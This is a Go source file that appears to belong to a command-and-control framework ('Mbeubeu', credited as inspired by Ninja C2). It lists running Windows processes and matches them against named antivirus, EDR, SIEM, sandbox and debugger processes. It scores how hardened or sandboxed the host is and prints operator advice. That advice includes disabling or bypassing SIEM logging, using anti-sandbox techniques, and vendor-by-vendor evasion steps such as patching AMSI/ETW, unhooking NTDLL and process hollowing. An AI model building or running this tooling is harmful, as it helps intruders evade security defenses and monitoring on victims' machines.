
/*
	This functionality is inspired from Ninja C2
	https://github.com/ahmedkhlief/Ninja

*/

package eva

import (
	"fmt"
	//"os/exec"
	"strings"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
)

const (
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Reset  = "\033[0m"
)

// PROCESSENTRY32 structure
type ProcessEntry32 struct {
	Size            uint32
	CntUsage        uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	CntThreads      uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [260]uint16
}

func getProcessList() ([]string, error) {
	var processes []string

	// Load kernel32.dll and get function addresses
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	createToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	process32First := kernel32.NewProc("Process32FirstW")
	process32Next := kernel32.NewProc("Process32NextW")

	// Create process snapshot
	snapshot, _, _ := createToolhelp32Snapshot.Call(
		uintptr(0x2), // TH32CS_SNAPPROCESS
		uintptr(0),
	)
	if snapshot == uintptr(windows.InvalidHandle) {
		return nil, fmt.Errorf("failed to create snapshot")
	}
	defer windows.CloseHandle(windows.Handle(snapshot))

	var entry ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	// Get first process
	ret, _, _ := process32First.Call(
		snapshot,
		uintptr(unsafe.Pointer(&entry)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("Process32First failed")
	}

	for {
		// Convert process name to Go string
		name := windows.UTF16ToString(entry.ExeFile[:])
		processes = append(processes, strings.ToLower(name))

		// Clear structure for next iteration
		entry = ProcessEntry32{}
		entry.Size = uint32(unsafe.Sizeof(entry))

		// Get next process
		ret, _, _ := process32Next.Call(
			snapshot,
			uintptr(unsafe.Pointer(&entry)),
		)
		if ret == 0 {
			break
		}
	}

	return processes, nil
}




var AVList = map[string][]string{
    "Kaspersky":              {"avp", "avpui", "klif", "kavfs", "kavfsslp", "prunsrv", "klnagent", "kavfswp"},
    "Malwarebytes":           {"mbcloudea", "mbamservice", "mbamtray", "mbamweb", "mbae64"},
    "Symantec":               {"smcgui", "sisipsservice", "semsvc", "snac64", "sesmcontinst", "ccSvcHst", "ccApp"},
    "Bitdefender":            {"vsserv", "bdagent", "bdredline", "bdservicehost", "seccenter"},
    "TrendMicro":             {"tmntsrv", "pwmtower", "smex_systemwatcher", "smex_master", "tmlisten", "ntrtscan"},
    "Windows Defender":       {"msmpeng", "nissrv", "securityhealthservice", "mpcmdrun"},
    "Avast":                  {"aswbcc", "bcc", "avastsvc", "avastui", "afwserv", "avastbaboonscan"},
    "Cylance":                {"cylancesvc", "cylanceui", "cyoptics", "cyupdate", "cymemdef"},
    "ESET":                   {"epfw", "epfwlwf", "epfwwfp", "egui", "ekrn", "eamonm", "ehdrv"},
    "FireEye Endpoint Agent": {"xagt", "xagtnotif"},
    "F-Secure":               {"fsdevcon", "fsorspclient", "fshoster", "f-secure", "fssm32"},
    "McAfee":                 {"enterceptagent", "mcafeeengineservice", "mcafeeframework", "mcdatrep", "mcscript_inuse", "amupdate", "mfevtp", "mcshield"},
    "SentinelOne":            {"sentinelagent", "sentinelone", "sentinelstaticengine", "sentinelmonitor"},
    "Sophos":                 {"sophosssp", "sophossps", "almon", "alsvc", "swc_service", "swi_fc", "swi_filter", "swi_service", "savservice", "hitmanpro"},
    "ZoneAlarm":              {"zlclient", "zang", "zaprivacy"},
    "Panda AntiVirus":        {"avengine", "psanhost", "psuamain", "pavsrv"},
    "AVG":                    {"avgemc", "avgui", "avgidsagent", "avgsvc"},
    "Avira":                  {"avscan", "avguard", "avshadow", "avmailc", "apnstub"},
    "G Data":                 {"avkproxy", "avkcl", "avkmgr", "avkservice"},
    "Cybereason":             {"cybereason", "cybereasonransomfree", "crssvc"},
    "Palo Alto XDR":          {"cyvera", "cyveraconsole", "tlaworker", "cortex"},
    "CrowdStrike":            {"csagent", "csfalcon", "csa", "cstrace", "cswh"},
    "Carbon Black":           {"vmwarecarbonblack", "cb", "cbsensor", "cbcomms"},
    "Microsoft Defender for Endpoint": {"senseir", "sensecm", "wincollect"},
    "Elastic Endpoint Security":       {"elastic-endpoint", "elastic-agent"},
    "FortiEDR":               {"fortiedr", "fctedr", "fctsrv"},
    "Check Point":             {"cprid", "cpa", "cnotify"},
    "Cisco Secure Endpoint":   {"ampsece", "ampsvc", "orbit"},
    "Trusteer (IBM)":          {"rapport", "rappsrv", "raptor"},
    "Webroot":                 {"wrccore", "wrprofctl", "wrsa"},
    "VIPRE":                   {"sbamsvc", "sbamtray", "vipreagent"},
    "Comodo":                  {"cmdagent", "cavwp", "cis"},
    "Deep Instinct":           {"deepinstinct", "deepinstinctagent", "di"},
    "BlackBerry Cylance":      {"cylance", "cymemdef", "cyoptics"},
    "VMware Carbon Black":     {"cb", "cbsensor"},
    "Qihoo 360":               {"zhudongfangyu", "360rp", "360safebox"},
    "Acronis":                 {"arsm", "afcdpsrv", "acronisagent"},
    "Emsisoft":                {"a2service", "a2guard", "a2cmd"},
    "NANO Antivirus":          {"nanoreport", "nanosvc", "nanoadminservice"},
    "ClamAV":                  {"clamd", "freshclam", "clamonacc"},
}


var AVScore = map[string]int{
    // High-Detection (Advanced EDR/ML)
    "CrowdStrike":            9,  
    "Microsoft Defender for Endpoint": 8,  
    "SentinelOne":            8,  
    "Cylance":                8,  
    "Carbon Black":           7,  
    "Elastic Endpoint Security": 7,
    "FireEye Endpoint Agent": 7,  
    "Kaspersky":              7,  
    "Palo Alto XDR":          7,  

    // Medium-High Detection
    "ESET":                   6,  
    "Symantec":               6,  
    "Bitdefender":            6,  
    "TrendMicro":             6,  
    "Sophos":                 6,  
    "Cybereason":             6,  

    // Medium Detection
    "Windows Defender":       5,  
    "Malwarebytes":           5,  
    "F-Secure":               5,  
    "McAfee":                 5,  
    "VMware Carbon Black":    5,  
    "FortiEDR":               5,
    "Cisco Secure Endpoint":  5,

    // Lower Detection (Signature-Based)
    "Avast":                  4,  
    "AVG":                    4,
    "Avira":                  4,
    "ZoneAlarm":              3,
    "Panda AntiVirus":        3,
    "G Data":                 3,
    "Webroot":                3,
    "Comodo":                 3,
    "ClamAV":                 2,  // Open-source (weak heuristics)
}


var SIEMList = map[string][]string{
	"Splunk": {
		"splunkd", "splunk-admon", "splunk-winevtlog", "splunk-netmon", "splunkuf", "splunk-forwarder",
	},
	"Sysmon": {
		"sysmon", "sysmon64",
	},
	"Elastic Stack": {
		"winlogbeat", "filebeat", "metricbeat", "auditbeat", "packetbeat", "heartbeat",
	},
	"Graylog": {
		"nxlog", "gelf", "sidecar", "graylog-collector-sidecar",
	},
	"LogRhythm": {
		"lragent", "logrhythmagent", "lragentservice",
	},
	"Microsoft Defender for Endpoint": {
		"sense", "mssense", "mdatp",
	},
	"OSSEC / Wazuh": {
		"ossec-agent", "wazuh-agent", "wazuh-modulesd", "wazuh-analysisd",
	},
	"McAfee SIEM": {
		"nitroguard", "esmcollector",
	},
	"IBM QRadar": {
		"qradar-ep", "ecs-ec-ingress", "ecs-ec",
	},
	"Arcsight": {
		"arcsight", "arcsight_agent",
	},
	"AlienVault (OSSIM/USM)": {
		"ossec-control", "alienvault-agent", "avagent",
	},
	"SentryOne / SolarWinds": {
		"swisservice", "solarwinds", "semagent", "lemagent",
	},
	"Tanium": {
		"taniumclient", "taniumendpoint",
	},
}




var SandboxIOC = map[string]int{
	"wireshark":        6,
	"vboxservice":      7,
	"vboxtray":         7,
	"autorun":          7,
	"procexp":          7,
	"procmon":          7,
	"tcpview":          7,
	"powershell_ise":   4,
	"sysmon":           7,

	// Reverse Engineering Tools
	"x64dbg":           8,
	"x32dbg":           8,
	"ollydbg":          8,
	"ida":              8,
	"ida64":            8,
	"ghidra":           8,
	"windbg":           8,
	"immunitydebugger": 8,

	// Sandboxing / VM Indicators
	"vmtoolsd":         6,
	"vmwaretray":       6,
	"vmwareuser":       6,
	"vmsrvc":           6,
	"qemu-ga":          6,
	"qemu":             6,
	"virtualbox":       6,
	"vmmouse":          6,
	"vboxguest":        6,
	"virtualpc":        6,
	"hyperv":           6,

	// EDR/AV Processes
	"csrss":            9,
	"avgsvc":           9,
	"avp":              9,  // Kaspersky
	"windefend":        9,
	"msmpeng":          9,
	"norton":           9,
	"bdservicehost":    9,  // BitDefender
	"sentinel":         9,  // SentinelOne
	"carbonblack":      9,
	"crowdstrike":      9,
	"cyserver":         9,  // Cylance
	"malwarebytes":     9,

	// Network Forensics Tools
	"fiddler":          6,
	"burpsuite":        6,
	"charles":          6,

	// Logging / Analysis Frameworks
	"eventvwr":         4,
	"perfmon":          4,
	"logman":           4,

	// Behavior Analysis Environments
	"cuckoo":           5,
	"any.run":          5,
	"joe sandbox":      5,
	"threatgrid":       5,
	"malwr":            5,
	"hybrid-analysis":  5,

}

func AdvancedDefenseAnalysis() string {
	var report strings.Builder
	var avVendorsDetected []string
	var siemDetected []string
	var sandboxScores []int
	var avScores []int

	
	processes, err := getProcessList()
	if err != nil {
		return Red + "Error retrieving process list: " + err.Error() + Reset
	}

	tasklist := strings.ToLower(strings.Join(processes, " "))



	for vendor, procs := range AVList {
		for _, proc := range procs {
			if strings.Contains(tasklist, strings.ToLower(proc)) {
				if !contains(avVendorsDetected, vendor) {
					avVendorsDetected = append(avVendorsDetected, vendor)
					avScores = append(avScores, AVScore[vendor])
				}
			}
		}
	}

	for vendor, procs := range SIEMList {
		for _, proc := range procs {
			if strings.Contains(tasklist, strings.ToLower(proc)) {
				if !contains(siemDetected, vendor) {
					siemDetected = append(siemDetected, vendor)
				}
			}
		}
	}

	for indicator, scoreVal := range SandboxIOC {
		if strings.Contains(tasklist, strings.ToLower(indicator)) {
			sandboxScores = append(sandboxScores, scoreVal)
		}
	}

	report.WriteString(Blue + "Mbeubeu Defense Analysis \n")
	report.WriteString("--------------------------------\n\n" + Reset)

	// SIEM Analysis
	if len(siemDetected) > 0 {
		report.WriteString(Yellow + "SIEM Detected: " + strings.Join(siemDetected, ", ") + Reset + "\n")
		report.WriteString(Red + "-> Recommendation: Investigate and disable or bypass SIEM logging mechanisms.\n\n" + Reset)
	} else {
		report.WriteString(Green + "No SIEM processes detected.\n\n" + Reset)
	}

	// AV Analysis
	if len(avVendorsDetected) > 0 {
		report.WriteString(Yellow + "Antivirus (AV) Detected: " + strings.Join(avVendorsDetected, ", ") + Reset + "\n")
		for _, vendor := range avVendorsDetected {
			guidance := getAVGuidance(vendor)
			report.WriteString(fmt.Sprintf(" - %s: %s\n", vendor, guidance))
		}
		report.WriteString("\n")
	} else {
		report.WriteString(Green + "No Antivirus (AV) processes detected.\n\n" + Reset)
	}

	var avScoreTotal int
	for _, s := range avScores {
		avScoreTotal += s
	}
	avScoreAvg := 0.0
	if len(avScores) > 0 {
		avScoreAvg = float64(avScoreTotal) / float64(len(avScores))
	}
	report.WriteString(fmt.Sprintf(Blue+"AV Hardness Score (Average): %.1f/10\n"+Reset, avScoreAvg))
	if avScoreAvg <= 4 {
		report.WriteString(Green + " -> Guidance: System is likely easy to pwn.\n\n" + Reset)
	} else if avScoreAvg <= 7 {
		report.WriteString(Yellow + " -> Guidance: System is moderately hardened; careful exploitation is needed.\n\n" + Reset)
	} else {
		report.WriteString(Red + " -> Guidance: System is highly hardened; bypassing defenses will be challenging.\n\n" + Reset)
	}

	var sandboxTotal int
	for _, s := range sandboxScores {
		sandboxTotal += s
	}
	sandboxAvg := 0.0
	if len(sandboxScores) > 0 {
		sandboxAvg = float64(sandboxTotal) / float64(len(sandboxScores))
	}
	report.WriteString(fmt.Sprintf(Blue+"Sandbox Score (Average): %.1f/10\n"+Reset, sandboxAvg))
	if sandboxAvg <= 4 {
		report.WriteString(Green + " -> Guidance: Likely running on a real live system.\n" + Reset)
	} else if sandboxAvg <= 7 {
		report.WriteString(Yellow + " -> Guidance: Possibly a security analyst device; proceed with caution.\n" + Reset)
	} else {
		report.WriteString(Red + " -> Guidance: Likely a sandbox environment; consider anti-sandbox techniques.\n" + Reset)
	}

	return report.String()
}

func contains(slice []string, item string) bool {
	for _, v := range slice {
		if v == item {
			return true
		}
	}
	return false
}

func getAVGuidance(vendor string) string {
	switch vendor {
	case "Kaspersky":
		return "Bypass KLIF driver hooks via IRP MajorFunction hook avoidance. Use encrypted payload staging with VXUnderground-style string obfuscation. Ref: https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/"

	case "Malwarebytes":
		return "Use NTDLL unhooking via fresh DLL mapping. Bypass exploit protection with ROP chain execution. Ref: https://thesecurityvault.com/how-antivirus-works-and-bypass-techniques-part-1/"

	case "Symantec":
		return "Implement Process Doppelgänging with transacted file operations. Bypass memory scans using custom Vectored Exception Handling (VEH). Ref: https://www.packtpub.com/product/antivirus-bypass-techniques/9781801079747"

	case "Bitdefender":
		return "Use Gargoyle-style RX memory protection bypass. Spoof memory page permissions during payload staging. Ref: https://medium.com/verylazytech/antivirus-evasion-for-beginners"

	case "TrendMicro":
		return "Bypass AEGIS engine with time-stomped process hollowing. Implement fake browser extension execution context. Ref: https://thesecurityvault.com/how-antivirus-works-and-bypass-techniques-part-1/"

	case "Windows Defender":
		return "Patch AMSI/ETW in-memory using hardware breakpoints. Bypass cloud checks with scheduled task XML spoofing. Ref: https://medium.com/redfoxsecurity/antivirus-evasion-26a30f072f76"

	case "Avast":
		return "Use Process Herpaderping for on-disk artifact obfuscation. Implement randomized API call ordering with IAT encryption. Ref: https://cocomelonc.github.io/tutorial/2021/12/25/simple-malware-av-evasion-3.html"

	case "Cylance":
		return "Bypass ML model via benign process mimicry. Use sleep obfuscation with GetTickCount spoofing. Ref: https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/"

	case "ESET":
		return "Use Early Bird APC injection. Bypass memory scans with W^X memory permission cycling. Ref: https://cocomelonc.github.io/tutorial/2021/12/25/simple-malware-av-evasion-3.html"

	case "FireEye Endpoint Agent":
		return "Implement multi-stage payload with environmental keying. Spoof FireEye-specific registry artifacts. Ref: https://medium.com/redfoxsecurity/antivirus-evasion-26a30f072f76"

	case "F-Secure":
		return "Use Module Stomping with legitimate signed binaries. Implement TLS callback injection for anti-dump protection. Ref: https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/"

	case "McAfee":
		return "Bypass RealProtect with NtCreateThreadEx suspended thread injection. Spoof McAfee service handles. Ref: https://thesecurityvault.com/how-antivirus-works-and-bypass-techniques-part-1/"

	case "SentinelOne":
		return "Use direct syscalls via SysWhispers3. Unhook NTDLL using file mapping from \\KnownDlls. Ref: https://medium.com/cytomate/arsenal-d4c400232025"

	case "Sophos":
		return "Bypass Intercept X with WNF callback execution. Use .NET CLR hijacking techniques. Ref: https://www.packtpub.com/product/antivirus-bypass-techniques/9781801079747"

	case "ZoneAlarm":
		return "Implement process ghosting with section object reuse. Bypass firewall with DNS tunneling over DoH. Ref: https://cocomelonc.github.io/tutorial/2021/12/25/simple-malware-av-evasion-3.html"

	case "Panda AntiVirus":
		return "Use registry-based payload storage. Bypass cloud analysis with delayed COM object activation. Ref: https://thesecurityvault.com/how-antivirus-works-and-bypass-techniques-part-1/"

	case "AVG":
		return "Bypass IDP with .NET dynamic assembly loading. Implement fake antivirus telemetry reports. Ref: https://medium.com/verylazytech/antivirus-evasion-for-beginners"

	case "Avira":
		return "Use kernel callback removal via undocumented KTHREAD structures. Spoof Avira service PID checks. Ref: https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/"

	case "G Data":
		return "Implement memory-only UAC bypass. Use window message pumping for execution timing obfuscation. Ref: https://cocomelonc.github.io/tutorial/2021/12/25/simple-malware-av-evasion-3.html"

	case "Cybereason":
		return "Bypass MalOp engine via ROP chain execution. Use memory guard pages with PAGE_TARGETS_INVALID. Ref: https://medium.com/redfoxsecurity/antivirus-evasion-26a30f072f76"

	case "Palo Alto XDR":
		return "Bypass Cortex with DNS-over-HTTPS C2. Spoof process metadata in PEB using NtQueryInformationProcess hooks. Ref: https://medium.com/redfoxsecurity/antivirus-evasion-26a30f072f76"

	case "CrowdStrike":
		return "Bypass kernel callbacks via Heaven's Gate syscalls. Use memory-only execution with sRDI and PPID spoofing. Ref: https://medium.com/cytomate/arsenal-d4c400232025"

	case "Carbon Black":
		return "Use APC queuing to trusted signed binaries. Bypass sensor via direct Win32k syscalls. Ref: https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/"

	case "Microsoft Defender for Endpoint":
		return "Spoof stack traces with RtlCaptureContext forgery. Implement fake cloud telemetry using scheduled WMI events. Ref: https://medium.com/redfoxsecurity/antivirus-evasion-26a30f072f76"

	case "Elastic Endpoint Security":
		return "Bypass Fibratus kernel tracing via IRP manipulation. Use .NET dynamic assembly stomping. Ref: https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/"

	case "FortiEDR":
		return "Implement firmware version spoofing. Use session table manipulation with forged TCP sequence numbers. Ref: https://thesecurityvault.com/how-antivirus-works-and-bypass-techniques-part-1/"

	case "Check Point":
		return "Bypass SandBlast with MIME type confusion attacks. Use WebSocket fragmentation for C2 blending. Ref: https://www.packtpub.com/product/antivirus-bypass-techniques/9781801079747"

	case "Cisco Secure Endpoint":
		return "Implement certificate pinning bypass. Use QUIC protocol with custom UDP packet rotation. Ref: https://medium.com/cytomate/arsenal-d4c400232025"

	case "Trusteer (IBM)":
		return "Bypass rootkit detection via driver signature spoofing. Use APT34-style DNS record patterns. Ref: https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/"

	case "Webroot":
		return "Flood cloud telemetry with junk data. Use delayed execution via window message callbacks. Ref: https://thesecurityvault.com/how-antivirus-works-and-bypass-techniques-part-1/"

	case "VIPRE":
		return "Bypass signature scans with polymorphic code mutation. Implement .NET delegate marshalling bypass. Ref: https://medium.com/verylazytech/antivirus-evasion-for-beginners"

	case "Comodo":
		return "Use auto-containment bypass via process masquerading. Spoof COMODO firewall rules using WFP hooks. Ref: https://cocomelonc.github.io/tutorial/2021/12/25/simple-malware-av-evasion-3.html"

	case "Deep Instinct":
		return "Bypass D-Instinct AI with adversarial ML patterns. Use GPU-based computation spoofing. Ref: https://www.packtpub.com/product/antivirus-bypass-techniques/9781801079747"

	case "BlackBerry Cylance":
		return "Bypass ML model via PowerShell constrained language mode abuse. Use benign Microsoft-signed binary templates. Ref: https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/"

	case "VMware Carbon Black":
		return "Use section object duplication attacks. Bypass memory scans with memory domain injection (Halo's Gate). Ref: https://medium.com/cytomate/arsenal-d4c400232025"

	case "Qihoo 360":
		return "Bypass Chinese AV heuristics with long sleep intervals. Use GBK encoding obfuscation for strings. Ref: https://thesecurityvault.com/how-antivirus-works-and-bypass-techniques-part-1/"

	case "Acronis":
		return "Spoof backup process injection patterns. Use VSS shadow copy manipulation for persistence. Ref: https://medium.com/verylazytech/antivirus-evasion-for-beginners"

	case "Emsisoft":
		return "Bypass ransomware protection with custom memory encryption. Use NTFS extended attribute storage. Ref: https://cocomelonc.github.io/tutorial/2021/12/25/simple-malware-av-evasion-3.html"

	case "NANO Antivirus":
		return "Bypass heuristic scans with environmental awareness checks. Use GitHub API for config retrieval. Ref: https://www.packtpub.com/product/antivirus-bypass-techniques/9781801079747"

	case "ClamAV":
		return "Use basic XOR obfuscation with random padding. Implement payload splitting across multiple processes. Ref: https://thesecurityvault.com/how-antivirus-works-and-bypass-techniques-part-1/"

	default:
		return "Recommended: Combine memory encryption (sRDI), direct syscalls (SysWhispers3), and telemetry poisoning. Comprehensive guide: https://www.packtpub.com/product/antivirus-bypass-techniques/9781801079747"
	}
}
